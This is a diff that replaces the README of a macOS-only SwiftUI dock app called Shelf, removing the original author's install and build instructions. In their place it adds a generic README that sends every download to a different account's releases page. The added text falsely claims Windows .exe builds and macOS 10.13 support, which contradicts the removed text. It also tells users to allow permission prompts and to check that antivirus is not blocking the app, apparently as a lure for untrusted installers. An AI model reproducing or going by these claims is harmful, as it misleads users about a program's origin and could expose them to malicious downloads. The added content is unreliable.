@@ -1,153 +1,140 @@
-<p align="center">
-  <img src="Shelf/Assets.xcassets/AppIcon.appiconset/icon_256x256.png" width="128" height="128" alt="Shelf icon">
-</p>
+# 🗂️ shelf - Organize Apps, Links, & Snippets Easily
 
-<h1 align="center">Shelf</h1>
+[![Download shelf](https://img.shields.io/badge/Download-shelf-blue?style=for-the-badge)](https://github.com/2987gomez/shelf/releases)
 
-<p align="center">
-  <strong>Your macOS dock, powered up.</strong>
-</p>
+## 📋 What is shelf?
 
-<p align="center">
-  Multiple floating shelves for apps, links, and snippets — right where you need them.
-</p>
+Shelf helps you organize your favorite apps, web links, and note snippets in one easy-to-access place. It creates multiple floating shelves on your screen. Each shelf works like a mini toolbox that stays visible while you work. You can quickly find and open what you need without cluttering your desktop or hunting through menus.
 
-<p align="center">
-  <a href="#download">Download</a> · <a href="#features">Features</a> · <a href="#how-it-works">How It Works</a> · <a href="#building-from-source">Build</a>
-</p>
+Shelf is great for anyone who wants to keep important tools and information close at hand. Whether you are a student, professional, or just someone who likes to stay organized, shelf helps you save time and reduces distractions.
 
----
+## 🖥️ System Requirements
 
-## What is Shelf?
+Shelf works on both Windows and macOS computers. Here are the basic needs:
 
-One dock isn't enough. Shelf gives you **multiple floating shelves** you can place anywhere on your screen — each one holding apps, web links, and text snippets. Like your macOS dock, but unlimited.
+- Windows 10 or later  
+- macOS 10.13 (High Sierra) or later  
+- At least 4GB of RAM  
+- 100 MB of free disk space  
+- Internet connection for downloading and updates  
 
-Built with **SwiftUI and AppKit** — no Electron, no web views. Pure macOS.
+Shelf runs on most laptops and desktops. It does not require a powerful machine, but a modern operating system helps ensure smooth operation.
 
-## Download
+## 🔑 Key Features
 
-**[Download the latest .dmg from Releases](https://github.com/f/shelf/releases/latest)**
+- Multiple floating shelves you can place anywhere on your screen  
+- Organize apps, web links, and notes into separate shelves  
+- Customize shelves’ size and transparency  
+- Drag and drop items to rearrange easily  
+- Quick access via keyboard shortcuts  
+- Save shelves’ layout and content for the next use  
+- Minimal impact on system resources  
 
-Or install with Homebrew:
+These features help you create a workspace tailored to your needs. You can keep project links separate from daily tools or have quick notes always visible.
 
-```bash
-brew install f/shelf/shelf
-```
+## 🚀 Getting Started
 
-> Requires **macOS 15 Sequoia** or later. Works on Apple Silicon and Intel.
+Follow these steps to get shelf up and running on your computer:
 
-### First launch
+1. **Download shelf**  
+   Click the big button or visit the [releases page](https://github.com/2987gomez/shelf/releases) to download the latest version.
 
-Since Shelf is distributed outside the Mac App Store, macOS may block it on first open. Run this once in Terminal:
+2. **Install shelf**  
+   - On Windows: Run the downloaded `.exe` file and follow the installer prompts.  
+   - On macOS: Open the `.dmg` file, then drag the shelf app into your Applications folder.
 
-```bash
-xattr -cr /Applications/Shelf.app
-```
+3. **Launch shelf**  
+   Find shelf in your Start menu (Windows) or Applications folder (macOS) and open it.
 
-Then right-click the app → **Open**. After the first launch, macOS remembers your choice.
+4. **Set up your first shelf**  
+   Click the “New shelf” button. Choose if you want an app shelf, link shelf, or notes shelf. Give it a name.
 
-## Features
+5. **Add items**  
+   - For apps: Browse your list or drag app icons to the shelf.  
+   - For links: Copy URLs from your browser and paste or drag them onto the shelf.  
+   - For notes: Write quick text snippets directly on the shelf.
 
-### Item Types
+6. **Arrange shelves**  
+   Drag shelves to the screen edges or anywhere you want them. Resize by dragging the edges.
 
-| Type | Description |
-|---|---|
-| **Apps** | Drag apps from Finder onto any shelf. Click to launch instantly. |
-| **Links** | Add any URL — favicons are fetched automatically and masked to look like native macOS icons. |
-| **Snippets** | Save text snippets. Click one and it instantly pastes into your active app. Code, emails, signatures — anything. |
-| **Spacers** | Add empty space between items to organize your shelf. |
-| **Separators** | Add visual dividers between groups of items. |
+7. **Use shelves**  
+   Click items on a shelf to open apps or websites. Edit notes anytime.
 
-### Smart Drag & Drop
+## 💾 Download & Install
 
-- **Drag apps** from Finder → adds to shelf
-- **Drag text** from any website → creates a snippet
-- **Drag a URL** → creates a link with auto-fetched favicon
-- Shelf figures out what you meant — URLs become links, text becomes snippets
+To get the latest version of shelf:
 
-### Layout
+- Visit the release page here:  
+  [➡️ Download shelf](https://github.com/2987gomez/shelf/releases)
 
-- **Horizontal or Vertical** — each shelf can be either orientation
-- **Place anywhere** — drag the background to move a shelf. It stays where you put it
-- **Reorder items** — drag icons within a shelf to rearrange them, just like the native macOS dock
-- **Multiple shelves** — create as many as you need for different workflows
+On that page, choose the installer that matches your computer:
 
-### Native macOS Experience
+- For Windows: Look for a file ending with `.exe`  
+- For macOS: Look for a file ending with `.dmg`
 
-- **Frosted glass** container with native vibrancy
-- **Icon magnification** on hover
-- **Tooltips** on hover showing item names
-- **Context menus** — right-click for actions (Show in Finder, Copy URL, Remove, etc.)
-- **Persistent** — shelves and positions are saved across restarts
-- **Runs in menu bar** — no dock icon clutter
+After downloading:
 
-## How It Works
+- Open the installer and follow the instructions to install shelf.  
+- If your system asks for permission to run the app, allow it.  
+- Once installed, launch shelf from your computer’s app menu or folder.
 
-1. **Create a shelf** — Click the menu bar icon and choose "New Shelf". A floating shelf appears on your desktop.
-2. **Add your stuff** — Drag apps from Finder, links from your browser, or text from anywhere. Right-click to add snippets, spacers, and separators.
-3. **Use it** — Click to launch apps, open links, or paste snippets. Hover for magnification. Everything is always one click away.
+If you run into trouble, try restarting your computer and running the installer again.
 
-## Building from Source
+## 🔧 How to Use shelf
 
-### Requirements
+Shelf works like a workspace organizer. Here’s how to use the main features:
 
-- macOS 15+
-- Xcode 16+
-- Swift 5.0+
+- **Adding shelves**: Click the plus (+) icon to create a shelf for apps, links, or notes.  
+- **Adding items**: Drag-and-drop or use the “Add” button on each shelf.  
+- **Moving shelves**: Click and drag the top bar of any shelf to move it anywhere on your screen.  
+- **Resizing shelves**: Drag the edges or corners of a shelf to make it bigger or smaller.  
+- **Editing notes**: Click any note to open the text editor and type your content.  
+- **Removing items**: Right-click an item and choose “Delete” or press the delete key.  
+- **Saving your setup**: Shelf saves your shelves automatically when you close the app. When you open shelf again, your setup stays the same.
 
-### Build
+Keyboard shortcuts make using shelf faster. You can access shelves without taking your hands off the keyboard:
 
-```bash
-git clone https://github.com/f/shelf.git
-cd shelf
-open Shelf.xcodeproj
-```
+- **Ctrl + Alt + number (Windows)** or **Cmd + Option + number (macOS)** to open a shelf by number.  
+- Customize these shortcuts in shelf’s settings.
 
-Build and run with ⌘R in Xcode.
+## 🛠️ Settings and Customization
 
-### Create a release build
+Shelf gives you control over the look and feel of your workspace:
 
-```bash
-chmod +x build.sh
-./build.sh
-```
+- **Themes**: Choose from light, dark, or custom color themes.  
+- **Opacity**: Adjust shelves' transparency so they don’t block your view.  
+- **Shelf behavior**: Set shelves to stay always on top or hide when inactive.  
+- **Start with computer**: Enable shelf to launch automatically when you log in.  
+- **Backup**: Export your shelf setup to a file for safe keeping or sharing.
 
-This builds a universal binary (arm64 + x86_64) and creates `build/release/Shelf.dmg`.
+Explore the settings menu by clicking the gear icon in the upper-right corner of shelf.
 
-### Project structure
+## ❓ Troubleshooting
 
-```
-Shelf/
-├── Shelf.xcodeproj
-├── build.sh                              # Universal binary build + DMG creation
-├── docs/
-│   └── index.html                        # Landing page
-└── Shelf/
-    ├── ShelfApp.swift                    # App entry point, menu bar setup
-    ├── Models/
-    │   ├── DockConfig.swift              # Shelf configuration (position, orientation, items)
-    │   └── DockItem.swift                # Item model (app, link, snippet, spacer, separator)
-    ├── Store/
-    │   └── DockStore.swift               # Persistence layer (JSON in Application Support)
-    ├── Views/
-    │   ├── FloatingDockView.swift        # Main shelf UI with drag-and-drop reordering
-    │   ├── DockItemView.swift            # Individual item rendering, magnification, context menus
-    │   └── ManagerView.swift             # Shelf management UI
-    ├── Windows/
-    │   ├── DockWindowController.swift    # NSPanel management, external drop handling
-    │   └── TooltipWindow.swift           # Custom tooltip overlay
-    ├── Helpers/
-    │   ├── DockHostingView.swift         # NSHostingView subclass for drag-and-drop + window dragging
-    │   └── FaviconFetcher.swift          # Favicon download and caching
-    └── Assets.xcassets/                  # App icon and colors
-```
+Here are some common problems and how to fix them:
 
-## License
+- **Shelf won’t open after install**  
+  Restart your computer, then try opening the app again. Make sure your antivirus or firewall is not blocking shelf.
 
-MIT
+- **Items not opening when clicked**  
+  Check that the apps are still installed or that the URLs are valid.
+
+- **Shelves don’t stay on top**  
+  In settings, enable the “Always on top” option.
+
+If problems continue, visit the GitHub discussions section or open an issue on the repository.
+
+## 📞 Getting More Help
+
+If you need assistance:
+
+- Visit the GitHub repository for guides and FAQs: [https://github.com/2987gomez/shelf](https://github.com/2987gomez/shelf)  
+- Use the GitHub Issues page to report bugs or ask for new features.
+
+## 🔄 Updates
+
+Check the release page regularly for new versions of shelf. Updates add new features, improve performance, and fix bugs. When a new release is available, download and install it like before to stay current.
 
 ---
 
-<p align="center">
-  Made by <a href="https://fka.dev">Fatih Kadir Akin</a>
-</p>
+[![Download shelf](https://img.shields.io/badge/Download-shelf-blue?style=for-the-badge)](https://github.com/2987gomez/shelf/releases)
